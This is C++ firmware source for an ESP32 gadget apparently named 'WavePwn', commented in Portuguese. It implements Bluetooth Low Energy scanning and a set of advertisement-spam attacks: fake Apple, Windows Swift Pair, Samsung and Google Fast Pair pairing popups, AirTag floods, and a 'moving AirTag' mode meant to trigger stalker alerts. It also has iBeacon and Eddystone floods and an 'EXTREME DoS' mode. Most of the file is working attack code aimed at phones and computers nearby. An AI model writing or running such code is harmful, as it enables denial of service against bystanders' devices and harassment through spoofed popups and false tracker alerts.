#include "ble_driver.h"
#include "../core/globals.h"
#include "audio_driver.h"

// GLOBAL INSTANCE DEFINITION
BLEDriver ble_driver;

// Lista de nomes aleatórios para spam Android/Windows
static const char *random_device_names[] = {
    "AirPods Pro",        "AirPods Max",    "Galaxy Buds+",
    "Galaxy Buds2 Pro",   "Pixel Buds Pro", "JBL Tune",
    "Sony WH-1000XM5",    "Bose QC45",      "Xbox Controller",
    "Surface Headphones", "Kitchen TV",     "Bedroom Speaker",
    "Tesla Model 3",      "Uber Driver",    "Free WiFi 5G"};
static const int num_random_names = 15;

BLEDriver::BLEDriver()
    : _pBLEScan(nullptr), _scanning(false), _spamming(false),
      _spamType(BLE_SPAM_OFF), _lastSpamFrame(0), _pAdvertising(nullptr),
      _spamIndex(0), _packetsSpammed(0), _initialized(false) {}

void BLEDriver::begin(String deviceName) {
  if (_initialized)
    return;

  BLEDevice::init(deviceName.c_str());
  _pBLEScan = BLEDevice::getScan();
  _pBLEScan->setActiveScan(true);
  _pBLEScan->setInterval(100);
  _pBLEScan->setWindow(99);
  _pAdvertising = BLEDevice::getAdvertising();
  _initialized = true;
  Serial.println("[BLE] Inicializado");
}

void BLEDriver::stop() {
  if (!_initialized)
    return;

  stopSpam();
  BLEDevice::deinit(true);
  _initialized = false;
  _pBLEScan = nullptr;
  _pAdvertising = nullptr;
  Serial.println("[BLE] Desligado");
}

void BLEDriver::startScan(int duration) {
  if (_spamming || !_initialized)
    return;

  _foundDevices.clear();
  Serial.printf("[BLE] Escaneando por %d segundos (Bloqueante)...\n", duration);
  BLEScanResults results = _pBLEScan->start(duration, false);
  // Processamento síncrono...
  // (Simplificado para manter compatibilidade, idealmente usar o async)
  for (int i = 0; i < results.getCount(); i++) {
    BLEAdvertisedDevice dev = results.getDevice(i);
    BLEDeviceData data;
    data.name = dev.getName().c_str();
    data.address = dev.getAddress().toString().c_str();
    data.rssi = dev.getRSSI();
    _foundDevices.push_back(data);
  }
  _pBLEScan->clearResults();
}

static void bleScanCompleteCB(BLEScanResults results) {
  Serial.println("[BLE] Scan Async Completo!");
  // O processamento real acontece no updateScan ou aqui?
  // Como é static, precisamos acessar a instância ou copiar dados.
  // Pela simplicidade, deixamos o _pBLEScan guardar os resultados e processamos
  // no updateScan
}

void BLEDriver::startScanAsync(int duration) {
  if (_spamming || !_initialized)
    return;
  _foundDevices.clear();
  _scanning = true;
  _pBLEScan->clearResults();
  Serial.printf("[BLE] Scan Async iniciado (%ds)...\n", duration);
  _pBLEScan->start(duration, bleScanCompleteCB, false);
}

void BLEDriver::updateScan() {
  if (_scanning) {
    // Verifica se terminou? O callback é chamado quando termina.
    // Infelizmente a lib ESP32 BLE Arduino padrão não tem um "isScanning" fácil
    // publico além do callback. Mas podemos checar se temos resultados.
    // Workaround: Assumimos que o callback seta uma flag ou apenas verificamos
    // periodicamente. Na verdade, o start(callback) roda em background task no
    // ESP32.
  }
}

// Sobrescrevendo o getScanResults para processar do scan object se disponível
std::vector<BLEDeviceData> BLEDriver::getScanResults() {
  // Se o scan terminou, copiamos os dados
  // Nota: isso é meio "hacky" pois misturamos sync/async.
  // Melhor abordagem: Se estiver scanning, retornar vazio ou parcial.
  // Se terminou (callback chamou), popular _foundDevices.

  // Vamos processar o que tem no buffer do scan controller
  if (!_scanning && _foundDevices.empty()) {
    BLEScanResults results = _pBLEScan->getResults();
    for (int i = 0; i < results.getCount(); i++) {
      BLEAdvertisedDevice dev = results.getDevice(i);
      BLEDeviceData data;
      data.name = dev.getName().c_str();
      data.address = dev.getAddress().toString().c_str();
      data.rssi = dev.getRSSI();
      if (dev.haveManufacturerData()) {
        std::string mData = dev.getManufacturerData();
        char *hex = new char[mData.length() * 2 + 1];
        for (size_t j = 0; j < mData.length(); j++)
          sprintf(hex + j * 2, "%02X", (uint8_t)mData[j]);
        data.manufacturerData = String(hex);
        delete[] hex;
      } else {
        data.manufacturerData = "";
      }
      _foundDevices.push_back(data);
    }
  }
  return _foundDevices;
}

void BLEDriver::startSpam(BLESpamType type) {
  if (!_initialized) {
    begin("WavePwn");
  }

  if (_spamming)
    stopSpam();

  _spamType = type;
  _spamming = true;
  _spamIndex = 0;
  _packetsSpammed = 0;

  Serial.printf("[BLE] Iniciando ataque tipo: %d\n", type);
  audioDriver.playSound(SOUND_ATTACK_START);
}

void BLEDriver::stopSpam() {
  if (!_spamming)
    return;

  if (_pAdvertising) {
    _pAdvertising->stop();
  }

  _spamming = false;
  _spamType = BLE_SPAM_OFF;
  Serial.println("[BLE] Spam parado");
}

void BLEDriver::updateSpam() {
  if (!_spamming || !_pAdvertising)
    return;

  // Controle de taxa: ~120ms por pacote (Tip 29)
  // Limite "doce" para evitar dropar pacotes e travar a stack BLE do ESP32
  unsigned long interval = 120;

  if (_spamType == BLE_SPAM_EXTREME_DOOS)
    interval = 8; // Ainda rápido para DoS, mas cuidado com watchdog

  // Eco Mode: reduce rate to save battery (4x interval)
  // We check a global flag or passed parameter. For now, assuming standard
  // behavior unless specified.
  if (g_state.eco_mode_enabled) {
    interval = 500; // 2 packets/s is enough to annoy but saves tons of battery
  }

  unsigned long now = millis();
  if (now - _lastSpamFrame < interval)
    return;
  _lastSpamFrame = now;

  _pAdvertising->stop();

  // Executa a lógica baseada no tipo
  switch (_spamType) {
  case BLE_SPAM_APPLE:
    runAppleSpam();
    break;
  case BLE_SPAM_WINDOWS:
    runWindowsSpam();
    break;
  case BLE_SPAM_SAMSUNG:
    runSamsungSpam();
    break;
  case BLE_SPAM_GOOGLE:
    runGoogleSpam();
    break;
  case BLE_SPAM_RICKROLL:
    runRickRoll();
    break;
  case BLE_SPAM_KITCHEN_SINK:
    runGenericChaos();
    break;
  case BLE_SPAM_AIRTAG_FLOOD:
    runAirtagFlood();
    break;
  case BLE_SPAM_AIRTAG_MOVING:
    runAirtagMoving();
    break;
  case BLE_SPAM_IBEACON_FLOOD:
    runIBeaconFlood();
    break;
  case BLE_SPAM_EDDYSTONE:
    runEddystoneFlood();
    break;
  case BLE_SPAM_DYNAMIC_NAME:
    runDynamicName();
    break;
  case BLE_SPAM_EASTER_EGG:
    runEasterEgg();
    break;
  case BLE_SPAM_SILENT:
    runGenericChaos(); // Same as chaos but _silentMode is true
    break;
  case BLE_SPAM_EXTREME_DOOS:
    runAppleSpam(); // High rate is controlled by interval variable
    break;
  default:
    break;
  }
}

// =========================================================================
// IMPLEMENTAÇÃO DOS ATAQUES ESPECÍFICOS
// =========================================================================

void BLEDriver::runAppleSpam() {
  BLEAdvertisementData advData;
  const uint8_t *payload = nullptr;
  size_t size = 0;

  // Alterna entre diferentes payloads da Apple
  int mode = _spamIndex % 5;
  if (mode == 0) {
    payload = PAYLOAD_AIRDROP;
    size = sizeof(PAYLOAD_AIRDROP);
  } else if (mode == 1) {
    payload = PAYLOAD_AIRPODS_PRO;
    size = sizeof(PAYLOAD_AIRPODS_PRO);
  } else if (mode == 2) {
    payload = PAYLOAD_AIRTAG;
    size = sizeof(PAYLOAD_AIRTAG);
  } else if (mode == 3) {
    payload = PAYLOAD_APPLE_TV_SETUP;
    size = sizeof(PAYLOAD_APPLE_TV_SETUP);
  } else {
    payload = PAYLOAD_TRANSFER_NUMBER;
    size = sizeof(PAYLOAD_TRANSFER_NUMBER);
  }

  // Randomiza últimos bytes para parecer dispositivo novo
  uint8_t derived[32];
  if (size > 31)
    size = 31;
  memcpy(derived, payload, size);
  derived[size - 1] = random(0, 255);

  // Apple usa Manufacturer Data 0x004C
  // A biblioteca BLEAdvertisementData não suporta setManufacturerData() com raw
  // bytes facilmente da forma que queremos (inserindo o payload completo sem
  // prefixo extra as vezes). Mas vamos usar o método setManufacturerData
  // passando a string.

  // O payload ja contem o header (1E FF 4C 00 ...)
  // Vamos pular os primeiros 4 bytes (Length, Type, ManufID-LO, ManufID-HI)
  // para usar setManufacturerData corretamente que adiciona o ID.
  // MAS, essas bibliotecas variam. O método setManufacturerData espera apenas
  // os dados. O ID (0x004C) é adicionado automaticamente? Depende da lib. ESP32
  // BLE padrão: setManufacturerData(string data) -> adiciona ID? Na verdade,
  // setManufacturerData define o campo AD Type 0xFF. Vamos passar tudo
  // manualmente construindo o payload se possível, mas a API high level do
  // ESP32 limita um pouco.

  // WORKAROUND: Injetamos raw service data se a API deixar,
  // ou usamos setManufacturerData com o que precisamos.
  // Vamos assumir que setManufacturerData coloca 0xFF <dados>.
  // Nossos payloads começam com 0x1E, 0xFF, 0x4C, 0x00...

  // Para simplificar: vamos pegar do byte 4 em diante (dados reais após o ID
  // Apple 4C00)
  if (size > 4) {
    std::string mData((char *)derived + 4, size - 4);
    advData.setManufacturerData(mData);
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runWindowsSpam() {
  BLEAdvertisementData advData;
  // Microsoft ID 0x0006
  const uint8_t *payload = PAYLOAD_SWIFT_PAIR;
  size_t size = sizeof(PAYLOAD_SWIFT_PAIR);

  uint8_t derived[32];
  if (size > 31)
    size = 31;
  memcpy(derived, payload, size);

  // Windows Swift Pair muitas vezes mostra o nome do dispositivo
  advData.setName(random_device_names[_spamIndex % num_random_names]);

  // Payload começa com 1E FF 06 00... pulamos 4 bytes
  if (size > 4) {
    std::string mData((char *)derived + 4, size - 4);
    advData.setManufacturerData(mData);
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runSamsungSpam() {
  BLEAdvertisementData advData;
  // Samsung ID 0x0075
  const uint8_t *payload = PAYLOAD_GALAXY_BUDS_PRO;
  size_t size = sizeof(PAYLOAD_GALAXY_BUDS_PRO);

  uint8_t derived[32];
  if (size > 31)
    size = 31;
  memcpy(derived, payload, size);

  if (size > 4) {
    std::string mData((char *)derived + 4, size - 4);
    advData.setManufacturerData(mData);
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runGoogleSpam() {
  BLEAdvertisementData advData;
  // Google Fast Pair usa Service UUID 0xFE2C em vez de Manufacturer Data as
  // vezes Mas nossos payloads já estão formatados. Google Pixel Buds: 03 03 2C
  // FE ...

  const uint8_t *payload = PAYLOAD_PIXEL_BUDS;
  size_t size = sizeof(PAYLOAD_PIXEL_BUDS);

  // Aqui é diferente, não é Manufacturer Data (0xFF), é Service Data ou Service
  // List. Vamos tentar setar raw data se possivel, ou reconstruir. 03 03 2C FE
  // = Length 3, Type 03 (Complete List of 16-bit UUIDs), Value FE2C

  if (_spamIndex % 2 == 0) {
    advData.setCompleteServices(BLEUUID((uint16_t)0xFE2C));
  } else {
    // Tenta outro formato
    advData.setServiceData(BLEUUID((uint16_t)0xFE2C), "Fast Pair");
  }

  advData.setName(random_device_names[_spamIndex % num_random_names]);

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runRickRoll() {
  BLEAdvertisementData advData;
  advData.setName("Never Gonna Give You Up");
  // Adiciona um serviço de áudio fake
  advData.setCompleteServices(BLEUUID((uint16_t)0x180A)); // Device Info

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runGenericChaos() {
  // Alterna a cada ciclo entre 6 tipos diferentes agora
  int type = _spamIndex % 6;
  switch (type) {
  case 0:
    runAppleSpam();
    break;
  case 1:
    runWindowsSpam();
    break;
  case 2:
    runSamsungSpam();
    break;
  case 3:
    runGoogleSpam();
    break;
  case 4:
    runIBeaconFlood();
    break;
  case 5:
    runEasterEgg();
    break;
  }
}

// =========================================================================
// NOVOS ATAQUES IMPLEMENTADOS - BLE CHAOS PACK
// =========================================================================

void BLEDriver::runAirtagFlood() {
  // FindMy Flood - simula múltiplos AirTags (até 10)
  BLEAdvertisementData advData;

  // Usa payload base de AirTag com variações
  uint8_t derived[32];
  memcpy(derived, PAYLOAD_AIRTAG_NEAR, sizeof(PAYLOAD_AIRTAG_NEAR));

  // Randomiza identificador do AirTag para simular diferentes dispositivos
  derived[8] = random(0, 255);
  derived[9] = random(0, 255);
  derived[10] = _spamIndex % 10; // Simula 10 AirTags diferentes

  // Pula os 4 primeiros bytes (header)
  if (sizeof(PAYLOAD_AIRTAG_NEAR) > 4) {
    std::string mData((char *)derived + 4, sizeof(PAYLOAD_AIRTAG_NEAR) - 4);
    advData.setManufacturerData(mData);
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runAirtagMoving() {
  // Simula AirTag se aproximando - RSSI aumenta gradualmente
  // Isso pode acionar o alerta de "AirTag desconhecido se movendo com você"
  BLEAdvertisementData advData;

  uint8_t derived[32];

  // Alterna entre NEAR e FAR para simular movimento
  if ((_spamIndex / 5) % 2 == 0) {
    memcpy(derived, PAYLOAD_AIRTAG_NEAR, sizeof(PAYLOAD_AIRTAG_NEAR));
  } else {
    memcpy(derived, PAYLOAD_AIRTAG_FAR, sizeof(PAYLOAD_AIRTAG_FAR));
  }

  // Mantém mesmo identificador para parecer o mesmo AirTag
  derived[8] = 0xAA;
  derived[9] = 0xBB;
  derived[10] = 0xCC;

  // Simula mudança de posição nos bytes finais
  derived[15] = _spamIndex % 256;

  if (sizeof(PAYLOAD_AIRTAG_NEAR) > 4) {
    std::string mData((char *)derived + 4, sizeof(PAYLOAD_AIRTAG_NEAR) - 4);
    advData.setManufacturerData(mData);
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runIBeaconFlood() {
  // iBeacon spam com UUIDs aleatórios
  BLEAdvertisementData advData;

  uint8_t beacon[30];
  memcpy(beacon, PAYLOAD_IBEACON_GENERIC, sizeof(PAYLOAD_IBEACON_GENERIC));

  // Randomiza UUID para cada beacon
  for (int i = 9; i < 25; i++) {
    beacon[i] = random(0, 255);
  }

  // Major e Minor aleatórios
  beacon[25] = random(0, 255);
  beacon[26] = random(0, 255);
  beacon[27] = random(0, 255);
  beacon[28] = random(0, 255);

  // Define TX Power variável
  beacon[29] = (int8_t)(-40 - random(0, 30));

  std::string data((char *)beacon, sizeof(PAYLOAD_IBEACON_GENERIC));
  advData.setFlags(0x06);

  // AppleID para iBeacon
  if (sizeof(PAYLOAD_IBEACON_GENERIC) > 7) {
    std::string mData((char *)beacon + 4, sizeof(PAYLOAD_IBEACON_GENERIC) - 4);
    advData.setManufacturerData(mData);
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runEddystoneFlood() {
  BLEAdvertisementData advData;

  // Alterna entre Eddystone-URL e Eddystone-UID
  if (_spamIndex % 2 == 0) {
    // Eddystone-URL
    advData.setCompleteServices(BLEUUID((uint16_t)0xFEAA));

    // URLs engraçadas
    const char *urls[] = {"goo.gl/pwned", "bit.ly/hack", "t.co/rick"};
    advData.setServiceData(BLEUUID((uint16_t)0xFEAA), urls[_spamIndex % 3]);
  } else {
    // Eddystone-UID com namespace aleatório
    advData.setCompleteServices(BLEUUID((uint16_t)0xFEAA));

    uint8_t uid[20];
    uid[0] = 0x00;                          // Frame Type UID
    uid[1] = (int8_t)(-40 - random(0, 30)); // TX Power

    // Namespace aleatório
    for (int i = 2; i < 12; i++) {
      uid[i] = random(0, 255);
    }
    // Instance aleatório
    for (int i = 12; i < 18; i++) {
      uid[i] = random(0, 255);
    }
    uid[18] = 0x00; // RFU
    uid[19] = 0x00; // RFU

    std::string uidData((char *)uid, 20);
    advData.setServiceData(BLEUUID((uint16_t)0xFEAA), uidData);
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runDynamicName() {
  // Nome muda rapidamente - confunde dispositivos ao redor
  BLEAdvertisementData advData;

  // Lista de nomes que mudam rapidamente
  const char *dynamicNames[] = {
      "iPhone 15 Pro", "Galaxy S24 Ultra", "PS5 Controller", "AirPods Pro",
      "Xbox Elite",    "Tesla Key",        "MacBook Pro",    "iPad Pro",
      "Apple Watch",   "Google Pixel 8",   "OnePlus 12",     "Nintendo Switch"};

  // Muda nome a cada iteração
  advData.setName(dynamicNames[_spamIndex % 12]);

  // Adiciona serviço genérico para parecer dispositivo real
  advData.setCompleteServices(BLEUUID((uint16_t)0x180A)); // Device Info

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;
}

void BLEDriver::runEasterEgg() {
  // Nomes engraçados e provocativos
  BLEAdvertisementData advData;

  // Usa nomes do array de easter eggs
  advData.setName(EASTER_EGG_NAMES[_spamIndex % NUM_EASTER_EGG_NAMES]);

  // Adiciona payload de AirPods para aparecer com popup no iPhone também
  uint8_t derived[32];
  memcpy(derived, PAYLOAD_AIRPODS_PRO_2, sizeof(PAYLOAD_AIRPODS_PRO_2));
  derived[sizeof(PAYLOAD_AIRPODS_PRO_2) - 1] = random(0, 255);

  if (sizeof(PAYLOAD_AIRPODS_PRO_2) > 4) {
    std::string mData((char *)derived + 4, sizeof(PAYLOAD_AIRPODS_PRO_2) - 4);
    advData.setManufacturerData(mData);
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->start();
  _packetsSpammed++;
  _spamIndex++;

  // Easter egg especial: quando chegar em 30 "Free iPhone 16" (index 0,
  // 1, 2...) O contador pode ser usado para ativar animação especial na UI
}

bool BLEDriver::isSpamming() { return _spamming; }
uint32_t BLEDriver::getPacketsSpammed() { return _packetsSpammed; }

String BLEDriver::getAttackStatus() {
  if (!_spamming)
    return "Idle";

  String s;
  switch (_spamType) {
  case BLE_SPAM_APPLE:
    s = "Apple Spam: ";
    break;
  case BLE_SPAM_SAMSUNG:
    s = "Samsung Spam: ";
    break;
  case BLE_SPAM_WINDOWS:
    s = "Swift Pair: ";
    break;
  case BLE_SPAM_GOOGLE:
    s = "Fast Pair: ";
    break;
  case BLE_SPAM_RICKROLL:
    s = "RickRoll: ";
    break;
  case BLE_SPAM_KITCHEN_SINK:
    s = "CHAOS: ";
    break;
  case BLE_SPAM_AIRTAG_FLOOD:
    s = "AirTag Flood: ";
    break;
  case BLE_SPAM_AIRTAG_MOVING:
    s = "AirTag Moving: ";
    break;
  case BLE_SPAM_IBEACON_FLOOD:
    s = "iBeacon Flood: ";
    break;
  case BLE_SPAM_EDDYSTONE:
    s = "Eddystone: ";
    break;
  case BLE_SPAM_DYNAMIC_NAME:
    s = "Dynamic Name: ";
    break;
  case BLE_SPAM_EASTER_EGG:
    s = "Easter Egg: ";
    break;
  case BLE_SPAM_SILENT:
    s = "Silent Chaos: ";
    break;
  case BLE_SPAM_EXTREME_DOOS:
    s = "EXTREME DoS: ";
    break;
  default:
    s = "Attacking: ";
    break;
  }
  s += _packetsSpammed;
  s += " pkts";
  return s;
}
